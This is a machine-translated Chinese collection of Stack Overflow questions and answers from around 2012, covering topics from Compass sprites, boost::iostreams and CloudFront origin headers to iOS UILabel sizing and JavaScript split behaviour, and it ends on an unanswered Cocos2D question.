## 回答 #2

> 赞同：2
> 
> 时间：2013-01-03T00:17:41.867

Wobbals 是正确的，除了 Wabbals 提到的，生成会话/令牌非常简单，每种服务器语言（PHP、NodeJS、C#、Ruby）所需的示例代码位于 OpenTok 的[Github 页面](https://github.com/opentok)。

此外，如果您选择不使用服务器端代码并​​使用 Parse 来处理您的后端，那么有一篇[精彩](http://www.tokbox.com/blog/parse-has-opentok-ios-sdks-backend-so-you-dont-have-to/)的文章介绍了如何使用 Parse 的 OpenTok 云代码模块来生成会话和令牌。

祝你好运！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-05-01T12:00:25.943

我强烈觉得 tokbox 教程非常基础，但学习曲线更陡峭。所以我最终写出了我自己的应用程序兼教程。

虽然迟了，但我还是觉得有必要在这里发帖： [如何使用 parse 和 opentok(tokbox) 编写你的第一个 iPhone 视频聊天应用程序](http://www.iphonegamezone.net/how-to-write-your-first-iphone-video-chat-app-using-parse-and-opentok-tokbox/)

# compass-sass - 指南针精灵位置-x

> ID：13524956
> 
> 赞同：1
> 
> 时间：2012-11-23T07:50:43.553
> 
> 标签：compass-sass, css-sprites, background-position

我正在使用[指南针](http://compass-style.org/reference/compass/helpers/sprites/#sprite-position)精灵助手来定位图标，它在 y 轴上工作，但它位于 x 轴上的 0 处。现在我可以将 x 偏移设置为固定值，但我宁愿将其设置为“正确”。

这是我现在的代码：

```
background: {
  url: sprite-url($icons-sprite);
  repeat: no-repeat;
  position: sprite-position($icons-sprite, nav-active);
} 
```

这就是我想要实现的目标（伪代码）：

```
background: {
  url: sprite-url($icons-sprite);
  repeat: no-repeat;
  position: right sprite-position-y($icons-sprite, nav-active);
} 
```

有人对此有解决方案吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T17:59:44.280

## 自动精灵

在创建精灵贴图之前，您必须在精灵贴图的右侧指定您希望精灵拥有的精灵引擎（有关详细信息，请参阅[文档](http://compass-style.org/help/tutorials/spriting/customization-options/)）：

```
$icons-nav-active-position: 100%;
@import "icons/*.png"; 
```

`sprite-position()`然后像往常一样调用该函数：

```
position: sprite-position($icons-sprite, nav-active); 
```

## 手动精灵

当您调用 时`sprite-map()`，您必须传递参数`$<map>-<sprite>-position: 100%`（其中`<map>`表示包含您的精灵的文件夹名称）：

```
$icons-sprite: sprite-map("icons/*.png", $icons-nav-active-position: 100%);
background: {
  url: sprite-url($icons-sprite);
  repeat: no-repeat;
  position: sprite-position($icons-sprite, nav-active);
} 
```

*注意 1：*您可以传递参数`$position: 100%`来设置所有精灵的位置。
*注意 2：* **在**Compass 0.12.1 之前，要传递给的参数`sprite-map()`不以`<map>-`. 请参阅[问题 828](https://github.com/chriseppstein/compass/issues/828)。

# c++ - boost::iostreams::counter 似乎不起作用

> ID：13524960
> 
> 赞同：2
> 
> 时间：2012-11-23T07:51:10.787
> 
> 标签：c++, boost, iostream

我正在玩 boost::iostreams 和用户指南谈论过滤器“计数器”。所以我用这段代码试试：

```
#include <iostream>
#include <boost/iostreams/filtering_stream.hpp>
#include <boost/iostreams/device/null.hpp>
#include <boost/iostreams/filter/counter.hpp>
namespace io = boost::iostreams;
int main()
{
    io::counter cnt;
    io::filtering_ostream out(cnt | io::null_sink());
    out << "hello";
    std::cout << cnt.lines() << " " << cnt.characters() << std::endl;
} 
```

它总是给

```
0 0 
```

这似乎不是我所期待的。使用 gdb 进行的初步跟踪表明正在进行计数的计数器对象具有与对象“cnt”不同的地址。我想这是管道中的某种复制？如果是这样，过滤“计数器”有什么用？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T08:07:56.303

查看您可以使用[的文档：](http://www.boost.org/libs/iostreams/doc/classes/counter.html)

```
#include <iostream>
#include <boost/iostreams/filtering_stream.hpp>
#include <boost/iostreams/device/null.hpp>
#include <boost/iostreams/filter/counter.hpp>
namespace io = boost::iostreams;
int main()
{
    io::counter cnt;
    io::filtering_ostream out(cnt | io::null_sink());
    out << "hello";
    std::cout << out.component<io::counter>(0)->lines() << " " << out.component<io::counter>(0)->characters() << std::endl;
} 
```

或者：

```
#include <iostream>
#include <boost/iostreams/filtering_stream.hpp>
#include <boost/iostreams/device/null.hpp>
#include <boost/iostreams/filter/counter.hpp>
#include <boost/ref.hpp>
namespace io = boost::iostreams;
int main()
{
    io::counter cnt;
    io::filtering_ostream out;
    out.push(boost::ref(cnt));
    out.push(io::null_sink());
    out << "hello";
    std::cout << cnt.lines() << " " << cnt.characters() << std::endl;
} 
```

# scala - 为什么scala-ide不能在scala编辑器中刷新java类的变化？

> ID：13524965
> 
> 赞同：0
> 
> 时间：2012-11-23T07:51:15.683
> 
> 标签：scala, scala-ide

我发现使用 scala-ide 2.1.0 m2 的问题。我正在开发一个 java/scala 混合项目。当我在 java 类中添加一个方法并在 scala 中调用它时。Scala Ide 会报这个方法不存在的错误。我试图刷新项目，但我没有运气。我必须重新启动 Eclipse(3.7 indigo) 才能让 scala IDE 加载更新的 java 类。有什么方法可以让 scala IDE 在不重新启动 eclipse 的情况下识别 java 更改？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T08:03:34.673

在同样的情况下，清理项目对我有用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T07:57:10.430

Scala IDE 最近改进了很多。使用最新的 Eclipse IDE (Juno) 和最新版本的 Scala IDE，我在一个 Eclipse 项目（由 SBT 生成，但与这个问题不太相关）中混合 java 和 scala 时遇到了一些问题。我建议下载最新版本的 Eclipse 并安装最新版本的 Scala IDE。

# apple-push-notifications - Ping 到 APNS 不返回

> ID：13524971
> 
> 赞同：3
> 
> 时间：2012-11-23T07:51:58.427
> 
> 标签：apple-push-notifications, ping

我正在尝试连接到 Apple 的推送通知服务器并推送一些通知。所有连接尝试都超时。尝试 ping 服务器***gateway.sandbox.push.apple.com***和***gateway.push.apple.com***并且它们无法访问。这些服务器是否存在且可访问？任何机构都可以验证它们是可以到达的吗？是区域问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T09:33:45.007

我在 Apple 论坛上发布了这个问题，但没有得到任何回应。但是，经过大量实验，我自己弄清楚了。任何通过代理路由到 APNS 的请求，无论是 ping 还是连接请求，都会在传输过程中被过滤掉，并且永远不会到达 APNS。这可能是出于苹果公司的安全考虑。这意味着来自您工作地点的机器的任何请求将永远不会通过，因为它们总是通过代理服务器路由。**任何通过直接互联网连接发送而没有任何中间代理的请求都会发送到 APNS**。

要对此进行测试，您可以绑定您的移动 3G 连接并将其与您的 PC/笔记本电脑共享，然后尝试连接或 ping APNS，它应该会成功。您的 mpobile 3G 连接是直接的互联网连接。要使其在您的工作地点正常工作，请向您的 IT 部门寻求直接连接。

**更新**：碰巧是防火墙问题。在配置防火墙以允许连接到 APNS 范围的 IP 后解决。

# ruby - 以编程方式将页面发布到 Pocket（稍后阅读）

> ID：13524972
> 
> 赞同：2
> 
> 时间：2012-11-23T07:51:58.257
> 
> 标签：ruby

我需要从我的程序中将页面添加到[Pocket 。](http://getpocket.com)我找到了允许[发布页面的页面](http://help.getpocket.com/customer/portal/articles/661928-how-to-manually-save-to-pocket)[http://getpocket.com/edit](http://getpocket.com/edit)。

这是我的代码：

```
require 'net/http'

uri = URI('http://getpocket.com/edit')
res = Net::HTTP.post_form(uri, 'url' => 'http://www.google.com')
puts res.body 
```

我已经运行了它，但新页面没有出现在 Pocket Queue 中。为什么以及如何解决？

有没有其他方法可以以编程方式将页面发布到 Pocket？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T07:59:43.433

对于编程访问，您应该使用他们的 API。这是文档： http: [//getpocket.com/developer/docs/overview](http://getpocket.com/developer/docs/overview)

以下是[添加项目](http://getpocket.com/developer/docs/v3/add)的方法：

> 添加单个项目
> 
> 要将项目保存到用户的 Pocket 列表，您将向 /v3/add 端点发出单个请求。
> 
> 方法网址 [https://getpocket.com/v3/add](https://getpocket.com/v3/add)

# amazon-cloudfront - 有什么方法可以识别来自 CloudFront 的自定义源服务器的请求？

> ID：13524973
> 
> 赞同：15
> 
> 时间：2012-11-23T07:52:15.840
> 
> 标签：amazon-cloudfront

我正在使用具有自定义源的 CloudFront，并希望将某些进入 Web 应用程序的请求重定向到 CloudFront（客户端使用直接 URL，不能将其更改为基于 CloudFront 的 URL）。为了确保正确更新 CloudFront 上的缓存，我不得重定向来自 CloudFront 本身的请求。有没有办法在源服务器上识别此类请求？

CloudFront 是否向发送到源服务器的请求添加任何自定义标头？或者有没有其他可靠的方法来确定请求来自 CloudFront？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-12-06T20:06:29.470

是的，您可以通过检查用户代理来识别从云端到源服务器的请求。用户代理将是“Amazon CloudFront”

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2017-03-06T21:01:03.953

**更新**

这是一个老问题，但我的更新对某人研究或寻找新解决方案很有用。

最近 AWS 添加了新功能 Origin Custom Headers。您可以设置一个带有秘密值的标头，并通过 Web 服务器或您的应用程序在您的源服务器上检查它。

[![在此处输入图像描述](../Images/7850869454bac0811ccc7833a62542b4.png)](https://i.stack.imgur.com/4gMOR.jpg)

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2012-11-25T11:59:27.837

## 更新

Avinash Bijja 正确[指出](https://stackoverflow.com/a/13751637/45773)(+1)对于来自 Amazon CloudFront 服务器的请求， HTTP[用户代理](http://en.wikipedia.org/wiki/User_agent)标头*将是“Amazon CloudFront” 。*不幸的是，这似乎并没有被明确记录，但是在各个论坛中的各种帖子中都隐含地承认了这一点，例如，参见 AWS 团队对[用户代理字符串的响应 - CF 会覆盖用户代理字符串吗？](https://forums.aws.amazon.com/thread.jspa?messageID=420294#420294)：

> 你是对的。User-Agent 字段始终填充为“Amazon CloudFront”。

~~但是，事实证明这目前并不完全可靠，如果在发起的客户端请求中已经丢失了一个空的用户代理， [CloudFront 会向源发送一个空的用户代理：](https://forums.aws.amazon.com/message.jspa?messageID=370577#370577)~~

 ~~> 当原始客户端未发送用户代理时，我可以确认 CloudFront 未向源发送用户代理。我们对积压的用户代理处理进行了增强和修复，但目前没有发布日期。我已经给你发了一个 PM 有更多的细节。~~ 

~~至少截至 2013 年 2 月 7 日，这些增强和修复显然还没有推出。~~

这些增强和修复[已于 2013 年 8 月 5 日推出](https://forums.aws.amazon.com/message.jspa?messageID=370577#475819)（感谢[webbiedave](https://stackoverflow.com/questions/13524973/is-there-any-way-to-identify-requests-coming-to-custom-origin-server-from-cloudf/13550795?noredirect=1#comment27667418_13550795)的更新！）。

* * *

## 初步答案

> CloudFront 是否向发送到源服务器的请求添加任何自定义标头？

确实有人会这么认为，但至少它们似乎没有记录在我所期望的地方，即[CloudFront 如何处理和转发请求到您的自定义源服务器](http://docs.amazonwebservices.com/AmazonCloudFront/latest/DeveloperGuide/RequestAndResponseBehaviorCustomOrigin.html#RequestBehaviorCustomOrigin)。鉴于您可以控制原始服务器，您可能只是检查其 HTTP 访问日志吗？

> 或者有没有其他可靠的方法来确定请求来自 CloudFront？

您需要自己判断可靠性，但*CloudFront 转发到源服务器的 IP 地址是 CloudFront 服务器的 IP 地址，而不是最终用户计算机的 IP 地址。*- 因此您可以限制对已发布的[Amazon CloudFront 公共 IP 范围](https://forums.aws.amazon.com/ann.jspa?annID=910)的访问；但是，请注意各自的免责声明：

> CloudFront IP 地址经常更改，我们不能保证提前通知更改。我们将尽最大努力提供当前地址列表。**客户不应将这些地址用于关键任务应用程序**，并且绝不能在 DNS 名称中对其进行硬编码。*[强调我的]*

因此，您需要监控此论坛/帖子以尽早注意到相应的更改（当然，如果您的用例首先可以接受此约束）。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-05-25T15:41:50.027

CloudFront 似乎会在将`X-Amz-Cf-Id`每个请求转发到源之前为其添加一个标头。至少，它目前正在为我这样做。

[http://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/RequestAndResponseBehaviorCustomOrigin.html#request-custom-headers-behavior](http://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/RequestAndResponseBehaviorCustomOrigin.html#request-custom-headers-behavior)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-11-07T17:42:44.553

这可能应该是对 Reza 的回答的评论，但我不能这样做:)。

[为了完整起见，这里是有关Forwarding Custom Headers](http://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/forward-custom-headers.html)的官方文档的链接，目前声明如下。

> 您可以将 CloudFront 配置为在将请求转发到您的源时包含自定义标头。您可以为自定义源和 Amazon S3 存储桶指定每个源的自定义标头的名称和值。自定义标头有多种用途，例如：
> 
> > 您可以识别 CloudFront 转发到您的自定义源的请求。如果您想知道用户是否绕过 CloudFront，或者如果您使用多个 CDN 并且想要了解哪些请求来自每个 CDN，这将非常有用。（如果您使用的是 Amazon S3 源并且启用了 Amazon S3 服务器访问日志记录，则日志不包含标头信息。）

# c++ - 访问向量时中止

> ID：13524975
> 
> 赞同：1
> 
> 时间：2012-11-23T07:52:30.810
> 
> 标签：c++, vector, cpu

我写了一个运行的程序

1.  每 20 秒
2.  当运行那段代码的特定请求出现时。
3.  每 1 分钟

上面列表中的 1 和 3 是两个不同的实例，可以重叠。

## 程序

给麻烦的函数的签名。

```
bool ProcessInfoHandler::getCPUInfo (rsc::ProcInfo &procInfo, bool isThreadCall) 
```

在运行程序大约 3 天后，我遇到了下面提到的崩溃。

```
#2  0x000000000041fdb8 in sn_sig_handler (signum=6, siginfo=0x451a7d80, undocumented=    <value optimized out>) at common/main/sn_proc_main.cpp:109
#3  <signal handler called>
#4  0x00000031d9630265 in raise () from /lib64/libc.so.6
#5  0x00000031d9631d10 in abort () from /lib64/libc.so.6
#6  0x00000031d966a84b in __libc_message () from /lib64/libc.so.6
#7  0x00000031d967230f in _int_free () from /lib64/libc.so.6
#8  0x00000031d967276b in free () from /lib64/libc.so.6  
#9  0x00000000004367a5 in deallocate (this=0x66cff0, __position=..., __x=<value optimized out>)
at /usr/lib/gcc/x86_64-redhat-linux/4.1.2/../../../../include/c++/4.1.2/ext/new_allocator.h:94
#10 _M_deallocate (this=0x66cff0, __position=..., __x=<value optimized out>) at /usr/lib/gcc/x86_64-redhat-linux/4.1.2/../../../../include/c++/4.1.2/bits/stl_vector.h:133 
#11 std::vector<cpu_instance_data_t, std::allocator<cpu_instance_data_t> >::_M_insert_aux (this=0x66cff0, __position=..., __x=<value optimized out>)
at /usr/lib/gcc/x86_64-redhat-linux/4.1.2/../../../../include/c++/4.1.2/bits/vector.tcc:299
#12 0x0000000000431f8e in ProcessInfoHandler::getCPUInfo (this=<value optimized out>, procInfo=..., isThreadCall=false)
at /usr/lib/gcc/x86_64-redhat-linux/4.1.2/../../../../include/c++/4.1.2/bits/stl_vector.h:610
#13 0x00000000004333be in ProcessInfoHandler::getProcessInformation (this=0xc16f9c0, procInfoSeq=..., isThreadCall=false) at processinfohandler.cc:255 
```

## 我的问题

1.  与给出文件名和行号的第 13 帧不同，第 12 帧没有给出该信息。这是否意味着向量的引用传递存在问题？
2.  关于我应该如何继续调试这个特定的堆栈跟踪的任何指针？

`getCPUInfo`由于专有原因，无法给出代码。请建议是否有相同的解决方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T08:11:37.190

调用`std::vector<>::_M_insert_aux()`指示向量正在被修改`getCPUInfo`- 如果可以同时（在多个线程上）调用此代码，这由您的“3 列表”暗示，那么您需要有诸如互斥锁之类的东西来同步线程。

`std::vector`不是线程安全的。

# iphone - 在 iOS 中将 BASE64 加密图像作为字符串和其他信息发送

> ID：13524981
> 
> 赞同：2
> 
> 时间：2012-11-23T07:53:14.127
> 
> 标签：iphone, ios, xamarin.ios

我正在使用 Base64 编码以字符串的形式存储图像。我希望将该图像发送到 API 并获得 JSON 对象响应。我已经使用 ArrayList 在 Android 中部署了相同的内容，但由于 iOS 没有 ArrayList。如何才能做到这一点。

```
ArrayList nameValuePairs = new ArrayList();

  nameValuePairs.add(new BasicNameValuePair("serialnumber",ReplaceString(UserData.objUserData.getencryptedTerminalid()).trim()));
  nameValuePairs.add(new BasicNameValuePair("mobileimei",ReplaceString(EncryptionHelper.encryptText(telephonyManager.getDeviceId())).trim()));
  nameValuePairs.add(new BasicNameValuePair("submerchantguid",ReplaceString(EncryptionHelper.encryptText(Payment.merchantId)).trim()));
  nameValuePairs.add(new BasicNameValuePair("transactionid",ReplaceString(EncryptionHelper.encryptText(Payment.transactionId))));
  nameValuePairs.add(new BasicNameValuePair("emailid",ReplaceString(EncryptionHelper.encryptText(userEmail)).trim()));
  nameValuePairs.add(new BasicNameValuePair("mobileno",ReplaceString(EncryptionHelper.encryptText(userMobile)).trim()));
  nameValuePairs.add(new BasicNameValuePair("signature",encodedSignImage));
  nameValuePairs.add(new BasicNameValuePair("photo",encodedPhotoImage.trim()));

  InputStream is;
  // open data output stream
  OutputStream dos;

  HttpClient httpclient = new DefaultHttpClient();

  HttpPost httppost = new

  HttpPost(Constants.INFO_SUBMIT);

  httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

  HttpResponse response = httpclient.execute(httppost);

  HttpEntity entity = response.getEntity();

  is = entity.getContent();

  int ch;
  StringBuffer b = new StringBuffer();
  String responseString = "";

  while ((ch = is.read()) != -1) 
  {
   b.append((char) ch);
  }

  responseString = b.toString();
  JSONObject jsonObject = new JSONObject(responseString);
  statusString = (String) jsonObject.get("Status");

    }
 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T08:16:02.583

这里真的有三个不同的问题，我将分别回答：

1.  在与 Web 服务通信方面，您应该查看[RestKit](http://restkit.org)或[ASIHTTPRequest](https://github.com/pokeb/asi-http-request/tree/)或[AFNetworking](https://github.com/AFNetworking/AFNetworking)或类似的东西。如果您有兴趣编写自己的代码，可以使用[URL 加载系统编程指南](https://developer.apple.com/library/ios/documentation/Cocoa/Conceptual/URLLoadingSystem/Tasks/UsingNSURLConnection.html#//apple_ref/doc/uid/20001836-BAJEAIEE)`NSURLConnection`中讨论的内容。您还可以查看将在[NSURLConnection 类参考](https://developer.apple.com/library/ios/#documentation/Cocoa/Reference/Foundation/Classes/NSURLConnection_Class/Reference/Reference.html)中看到的各种示例，例如[SimpleURLConnections](https://developer.apple.com/library/ios/#samplecode/SimpleURLConnections/Introduction/Intro.html#//apple_ref/doc/uid/DTS40009245)

2.  在解析/创建 JSON 方面，您可以使用[`NSJSONSerialization`](http://developer.apple.com/library/ios/#documentation/Foundation/Reference/NSJSONSerialization_Class/Reference/Reference.html).

3.  在 base64 编码方面，我已经[在 GTM 中成功使用了 Google GTMBase64](http://code.google.com/p/google-toolbox-for-mac/)。但我建议你看看[How do I do base64 encoding on iphone-sdk?](https://stackoverflow.com/questions/392464/any-base64-library-on-iphone-sdk)

# c# - 显示没有矩形的文本

> ID：13524982
> 
> 赞同：0
> 
> 时间：2012-11-23T07:53:16.427
> 
> 标签：c#, google-maps, monodevelop, draw, itemizedoverlay

我正在使用 MonoDevelop for Android 和 MapsAndLocationDemo 开发一个 Android 手机应用程序。我想在每个覆盖项下显示一些文本。我已经重写了 Draw 方法来做到这一点。

这是我的代码：

```
 public override void Draw (Android.Graphics.Canvas canvas, MapView mapView, bool shadow)
        {
            base.Draw (canvas, mapView, shadow);

            var paint = new Paint ();
            paint.AntiAlias = true;

            var gp = overlayDetailsForThisOverlay.overlayGeoPoint;
            var pt = mapView.Projection.ToPixels (gp, null);     

            canvas.DrawRect (pt.X, pt.Y, pt.X + 50, pt.Y + 50, paint);
            canvas.DrawText("Test", pt.X, pt.Y, paint);
        } 
```

我只想显示文本。但是，如果我删除 canvas.DrawRect 代码行，则根本不会显示任何文本。

我是否可以在不绘制矩形的情况下在覆盖项下显示一些所需的文本？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T08:09:19.857

在你的 xml 布局中试试这个

```
 android:background="@android:color/transparent" 
```

# iphone - iOS - 表格视图单元格内的 UILabel

> ID：13524983
> 
> 赞同：0
> 
> 时间：2012-11-23T07:53:16.687
> 
> 标签：iphone, ios, cocoa-touch, uitableview

我对 iphone 开发非常陌生，并且在某一点上感到震惊。实际上，我需要的是在 a 中显示一些结果，`UITableView`然后`UILables`在`UITableView's`单元格中显示。我怎样才能`UILabel's`根据文本调整内容。实际上文本不是静态的。它可能在运行时发生变化。所以我需要将动态大小设置为 UILabel 。其次假设如果文本是`null`那么它不应该显示任何空间，并且下一个`UILabel`应该立即开始。我该怎么做有可能吗？这是我的代码..

```
self.tableView=[[UITableView alloc] initWithFrame:CGRectMake(0,150,320,800) style:UITableViewStylePlain];
            self.tableView.delegate=self;
            self.tableView.dataSource=self;
            self.tableView.scrollEnabled = NO;
            [self.view addSubview:self.tableView];

-(UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    if(currentHtmlElement==@"3")
    {
        static NSString *CellIdentifier=@"Cell";

        UITableViewCell* cell=[tableView dequeueReusableCellWithIdentifier:CellIdentifier];

        if(cell == nil)
        {
            cell = [[[UITableViewCell alloc]initWithStyle:UITableViewCellStyleDefault    reuseIdentifier:CellIdentifier]autorelease];
        }
        NSMutableDictionary *d = (NSMutableDictionary *) [arr2 objectAtIndex:indexPath.row];
        cell.accessoryType= UITableViewCellAccessoryDetailDisclosureButton;
       UILabel  *name1= [[UILabel alloc]initWithFrame:CGRectMake(10, 5, 320, 40)];
        name1.font=[UIFont boldSystemFontOfSize:16];
        [name1 setTextAlignment:UITextAlignmentLeft];
        [name1 setText:[d valueForKey:@"Name"]];
        name1.tag = 111;
        [cell addSubview:name1];
        [name1 release];

        UILabel *codetype=[[UILabel alloc]initWithFrame:CGRectMake(10, 45, 320,15)];
        codetype .font=[UIFont boldSystemFontOfSize:12];        
        [codetype setTextAlignment:UITextAlignmentLeft];
        [codetype  setText:[d valueForKey:@"Code"]];
        codetype.tag=112;
        [cell addSubview:codetype];
        [codetype  release];    

        UILabel *id=[[UILabel alloc]initWithFrame:CGRectMake(10, 68, 320,10)];
        id .font=[UIFont fontWithName:@"arial" size:12];        
        [id setTextAlignment:UITextAlignmentLeft];
        [id  setText:[d valueForKey:@"ID"]];
        id.tag=113;
        [cell id ];
        [id  release]; 

        UILabel *address=[[UILabel alloc]initWithFrame:CGRectMake(10, 85, 320,10)];
        address .font=[UIFont fontWithName:@"arial" size:12];        
        [address setTextAlignment:UITextAlignmentLeft];
        [address  setText:[d valueForKey:@"address"]];
        line2.tag=114;
        [cell addSubview: address];
        [address  release]; 

        UILabel *city = [[UILabel alloc]initWithFrame:CGRectMake(10, 105, 320, 10)];
        city .font=[UIFont fontWithName:@"arial" size:12];        
        [city  setTextAlignment:UITextAlignmentLeft];
        [city  setText:[d valueForKey:@"City"]];
        city.tag=115;
        [cell addSubview:city ];
        [city  release];
} 
```

在这里，我已将所有 UILabel 设置为静态大小。但我需要的是动态大小。假设如果地址标签为空，那么它不应该显示任何空间，下一个标签，即城市应该在 id 之后立即开始..怎么样可能的？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T14:27:19.483

我在我的代码中完成了这项任务....您可以使用此代码并根据您的代码进行更改....如果您遇到任何问题，请告诉我。

```
- (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath;
{
    NSMutableDictionary *dicNotification =[[NSMutableDictionary alloc]initWithDictionary: [myNotification objectAtIndex:indexPath.row]];

    //code to get notification text height
    NSString *text = [dicNotification  objectForKey:@"message"];
    CGSize constraint = CGSizeMake(175, 100.0f);
    CGSize size = [text sizeWithFont: [UIFont fontWithName:@"Verdana" size:12] constrainedToSize:constraint lineBreakMode:UILineBreakModeWordWrap];
    return size.height;
}

-(UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    NSString *CellIdentifier = @"Cell";

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

    if (cell == nil) 
    {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle reuseIdentifier:CellIdentifier];

        //label for message
        UILabel *lblMsg = [[UILabel alloc] initWithFrame:CGRectZero];
        lblMsg.tag = 12;
        lblMsg.backgroundColor = [UIColor clearColor];
        [lblMsg setFont:[UIFont fontWithName:@"Verdana" size:12]];
        [lblMsg setLineBreakMode:UILineBreakModeWordWrap];

        [cell addSubview:lblMsg];
    }

    NSMutableDictionary *dicNotification =[[NSMutableDictionary alloc]initWithDictionary: [myNotification objectAtIndex:indexPath.row]];

    //get the message height set frame height to imageView(BubbleMid & Top) & labelMSG
    NSString *txt = [dicNotification  objectForKey:@"message"];
    CGSize constraint = CGSizeMake(175, 2000.0f);
    CGSize size = [txt sizeWithFont: [UIFont fontWithName:@"Verdana" size:12] constrainedToSize:constraint lineBreakMode:UILineBreakModeWordWrap];

    //set frame height to labelMsg
    UILabel *lblMsg = (UILabel *)[cell viewWithTag:12];
    lblMsg.frame = CGRectMake(15,25, 175, size.height);
    [lblMsg setNumberOfLines:size.height/16];

    //set labelMsg text
    lblMsg.text = [dicNotification  objectForKey:@"message"];

    return cell;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T08:01:31.840

您可以`UILable`使用以下代码调整内容

```
CGSize sizeToMakeLabel = [name1.text sizeWithFont: name1.font]; 
name1.frame = CGRectMake(name1.frame.origin.x, name1.frame.origin.y, 
sizeToMakeLabel.width, sizeToMakeLabel.height); 
```

在这里设置第二个标签，如下所示..

**更新**

```
 if([[d valueForKey:@"address"] isEquelToString:@""]){
          UILabel *city=[[UILabel alloc]initWithFrame:CGRectMake(10, idLable.frame.origin.y + id.frame.size.height+10 , 320,15)];
          city .font=[UIFont fontWithName:@"arial" size:12];        
          [city  setTextAlignment:UITextAlignmentLeft];
          [city  setText:[d valueForKey:@"City"]];
          city.tag=115;
          [cell addSubview:city ];
          CGSize sizeToMakeLabel = [city.text sizeWithFont: city.font]; 
          city.frame = CGRectMake(city.frame.origin.x, city.frame.origin.y, 
sizeToMakeLabel.width, sizeToMakeLabel.height); 
        }
      else{
          UILabel * address =[[UILabel alloc]initWithFrame:CGRectMake(10, idLable.frame.origin.y + id.frame.size.height+10 , 320,15)];
address .font=[UIFont fontWithName:@"arial" size:12];        
          [address setTextAlignment:UITextAlignmentLeft];
          [address  setText:[d valueForKey:@"address"]];
          line2.tag=114;
          [cell addSubview: address];
          CGSize sizeToMakeLabel = [address.text sizeWithFont: address.font]; 
          address.frame = CGRectMake(address.frame.origin.x, address.frame.origin.y, 
sizeToMakeLabel.width, sizeToMakeLabel.height); 
        } 
```

等等每个标签..

对整个标签遵循这个逻辑

我希望这可以帮助你...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T08:05:32.497

问题是您必须使用 heightForRowAtIndexPath。问题是它在 cellForRowAtIndexPath 之前被调用，因此文本不在组件中，您不能简单地将组件大小调整为文本。因此，您所做的是使用 sizeWithFont 计算文本大小。

在**普通/标准文本的情况下**

```
- (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath
{
    //here you get your text string
    NSString* theText =  ... ; 

    //then calculate the size. systemFontOfSize depends on your font size
    //yourLabelWidth must be known and usually depends on scree size or if the tableview has an index
    CGSize textSize = [theText sizeWithFont:[UIFont systemFontOfSize:14] constrainedToSize:CGSizeMake(yourLabelWidth, MAXFLOAT) lineBreakMode:NSLineBreakByWordWrapping];

    return textSize.height;
} 
```

在**属性文本的情况下**

```
- (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath
{
    //here you get your text string
    NSAttributedString* theText =  ...;

    //then calculate the size.
    //yourLabelWidth must be known and usually depends on scree size or if the tableview has an index
    CGRect rectSize = [theText boundingRectWithSize:CGSizeMake(yourLabelWidth, MAXFLOAT) options:NSStringDrawingUsesLineFragmentOrigin context:NULL];

return rectSize.size.height;

    return textSize.height;
} 
```

# javascript - 是否有任何标准说明“aba”.split(/a/) 是否应该返回 1,2 或 3 个元素？

> ID：13524985
> 
> 赞同：9
> 
> 时间：2012-11-23T07:53:32.390
> 
> 标签：javascript, string, split

从我测试过的

```
"aba".split(/a/).length 
```

返回

*   1 在 ie8
*   3 在 Firefox、Chrome、Opera 中

我一直准备好处理 DOM 操作或事件模型中的差异，但我认为字符串、正则表达式等内容已经很好地定义了。我错了吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T08:08:43.277

IE 从`split`结果数组中删除所有未定义或空字符串。

由于您的问题似乎是关于标准的存在，那么 EcmaScript 是 Javascript 世界中的最佳匹配。

*并且记录了正则*表达式拆分的行为：http : [//www.ecma-international.org/ecma-262/5.1/#sec-15.5.4.14](http://www.ecma-international.org/ecma-262/5.1/#sec-15.5.4.14)

从示例中可以明显看出，不应从结果数组中删除空字符串，因此 IE（如怀疑）是错误的。

```
"A<B>bold</B>and<CODE>coded</CODE>".split(/<(\/)?([^<>]+)>/)

    evaluates to the array

["A", undefined, "B", "bold", "/", "B", "and", undefined,  "CODE", "coded", "/", "CODE", ""] 
```

实际上，浏览器之间还有其他差异。一种解决方案可能是使用[跨浏览器拆分正则表达式脚本](http://blog.stevenlevithan.com/archives/cross-browser-split)，但最好简单地了解差异并通过适当的测试处理`split`. 或者使用一些技巧。

# android - 如何在 Cocos2D-Android 中创建一个没有图像的可见矩形？

> ID：13524987
> 
> 赞同：1
> 
> 时间：2012-11-23T07:53:40.250
> 
> 标签：android, cocos2d-iphone, cocos2d-android

有人可以给我一个简单的例子，因为我正在尝试学习它，但还没有看到 Android 的例子，但 iOS 的例子很多。我想创建一个，以便更容易调试我的碰撞区域。提前致谢

* * *

## 回答 #1

> 赞同：2
> 
